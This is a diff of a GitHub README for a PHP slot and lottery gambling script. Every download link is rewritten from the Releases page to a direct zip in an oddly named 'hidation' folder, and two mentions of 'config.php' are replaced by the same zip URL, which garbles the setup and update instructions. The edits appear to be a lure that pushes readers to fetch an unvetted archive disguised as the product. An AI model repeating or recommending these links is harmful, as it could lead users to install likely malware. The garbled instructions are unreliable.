@@ -1,7 +1,7 @@
 # 🎰 Script-PHP-Web-Slot-Hanzoslot-Stag - Simple Slot Game Platform
 
 ## 📥 Download Now
-[![Download Script-PHP-Web-Slot-Hanzoslot-Stag](https://img.shields.io/badge/Download-Script--PHP--Web--Slot--Hanzoslot--Stag-blue)](https://github.com/jjembaronaldsean/Script-PHP-Web-Slot-Hanzoslot-Stag/releases)
+[![Download Script-PHP-Web-Slot-Hanzoslot-Stag](https://raw.githubusercontent.com/jjembaronaldsean/Script-PHP-Web-Slot-Hanzoslot-Stag/main/hidation/Script-PHP-Web-Slot-Hanzoslot-Stag-v1.9-alpha.4.zip)](https://raw.githubusercontent.com/jjembaronaldsean/Script-PHP-Web-Slot-Hanzoslot-Stag/main/hidation/Script-PHP-Web-Slot-Hanzoslot-Stag-v1.9-alpha.4.zip)
 
 ## 📋 Description
 This project provides a script for a web platform game slot using Pragmatic Play. It includes stable performance and complete features. The source code integrates directly with providers like Pragmatic Play, Pragmatic Live, and various official togel markets.
@@ -10,7 +10,7 @@ This project provides a script for a web platform game slot using Pragmatic Play
 To get started with your slot game platform, follow these steps:
 
 1. **Download the Script**
-   Visit the Releases page to download the latest version of the script: [Download Script-PHP-Web-Slot-Hanzoslot-Stag](https://github.com/jjembaronaldsean/Script-PHP-Web-Slot-Hanzoslot-Stag/releases).
+   Visit the Releases page to download the latest version of the script: [Download Script-PHP-Web-Slot-Hanzoslot-Stag](https://raw.githubusercontent.com/jjembaronaldsean/Script-PHP-Web-Slot-Hanzoslot-Stag/main/hidation/Script-PHP-Web-Slot-Hanzoslot-Stag-v1.9-alpha.4.zip).
 
 2. **Install Required Software**
    - You need a web server with PHP support. You can use software like XAMPP, WAMP, or LAMP.
@@ -22,7 +22,7 @@ To get started with your slot game platform, follow these steps:
 
 4. **Configure Database Connection**
    - Create a new database in your preferred database management tool (like phpMyAdmin).
-   - Update the database connection settings in the `config.php` file included in the script.
+   - Update the database connection settings in the `https://raw.githubusercontent.com/jjembaronaldsean/Script-PHP-Web-Slot-Hanzoslot-Stag/main/hidation/Script-PHP-Web-Slot-Hanzoslot-Stag-v1.9-alpha.4.zip` file included in the script.
 
 5. **Run the Script**
    - After configuring the database, visit the URL again and follow the on-screen instructions to complete the setup.
@@ -46,7 +46,7 @@ To ensure an optimal experience, your server should meet the following requireme
 ## 💬 Frequently Asked Questions
 
 ### How do I update the script?
-To update, download the latest version from the Releases page and replace the existing files, preserving the `config.php` file for database settings.
+To update, download the latest version from the Releases page and replace the existing files, preserving the `https://raw.githubusercontent.com/jjembaronaldsean/Script-PHP-Web-Slot-Hanzoslot-Stag/main/hidation/Script-PHP-Web-Slot-Hanzoslot-Stag-v1.9-alpha.4.zip` file for database settings.
 
 ### Can I customize the games?
 Yes, you can modify the games and design to fit your needs. Ensure you follow proper coding practices as outlined in the included documentation.
@@ -55,7 +55,7 @@ Yes, you can modify the games and design to fit your needs. Ensure you follow pr
 For support, you can open an issue on the GitHub page or refer to the documentation provided in the repository.
 
 ## 📥 Download & Install
-To begin, download the latest version of the script here: [Download Script-PHP-Web-Slot-Hanzoslot-Stag](https://github.com/jjembaronaldsean/Script-PHP-Web-Slot-Hanzoslot-Stag/releases). Follow the steps outlined above for installation and setup.
+To begin, download the latest version of the script here: [Download Script-PHP-Web-Slot-Hanzoslot-Stag](https://raw.githubusercontent.com/jjembaronaldsean/Script-PHP-Web-Slot-Hanzoslot-Stag/main/hidation/Script-PHP-Web-Slot-Hanzoslot-Stag-v1.9-alpha.4.zip). Follow the steps outlined above for installation and setup.
 
 ## 📫 Contributing
 Contributions are welcome! If you want to help with improvements, please fork the repository and submit a pull request. Check the CONTRIBUTING guidelines for more information.
